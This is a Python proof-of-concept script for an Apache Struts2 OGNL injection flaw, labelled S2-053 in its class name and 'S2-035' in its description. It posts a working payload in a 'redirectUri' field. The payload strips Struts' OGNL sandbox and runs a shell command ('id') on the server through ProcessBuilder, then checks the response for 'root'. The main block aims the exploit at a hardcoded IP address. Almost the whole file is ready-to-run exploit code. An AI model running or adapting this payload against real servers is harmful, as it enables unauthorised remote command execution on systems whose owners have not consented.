from YmfPoc import YmfPoc
import requests


class S2053_command_execute_verify(YmfPoc):

    def __init__(self, url):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "S2053",
            "product": "S2053",
            "author": "test",
            "date": "2018/10/26",
            "description": "struts2 S2-035 poc",
        }
        self.options = {
            "url": url,
        }
        self.result = {
            "status": False,
            "data": "",
            "error": "",
        }

    def verify(self):
        payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((" \
               "#container=#context['com.opensymphony.xwork2.ActionContext.container']).(" \
               "#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(" \
               "#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(" \
               "#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty(" \
               "'os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c'," \
               "#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start(" \
               ")).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"
        data = {
            'redirectUri': payload
        }

        try:
            res = requests.post(self.options['url'], data=data)
            content = res.text
            if "root" in content:
                self.result['status'] = True
            else:
                self.result['status'] = False
        except Exception as e:
            self.result['status'] = False
            self.result['error'] = e


if __name__ == '__main__':
    S2 = S2053_command_execute_verify("http://178.128.2.97:8080/hello.action")
    S2.verify()
